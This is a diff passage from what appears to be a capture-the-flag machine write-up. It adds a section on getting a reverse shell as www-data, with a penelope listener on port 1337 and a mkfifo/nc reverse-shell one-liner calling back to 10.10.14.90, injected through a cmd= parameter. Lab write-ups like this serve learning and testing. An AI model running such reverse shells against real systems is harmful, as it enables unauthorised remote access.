@@ -203,5 +203,17 @@ As seen at the end of the output i have remote code execution!!
 
 # Reverse shell as `www-data`
 ```python
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+Ill set a listener to start 
+
+```python
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.90 1337 >/tmp/f
+```
+Ill use the same method as before just place this in the `cmd=` parameter making sure its URL encoded
+
+```python
 
 ```
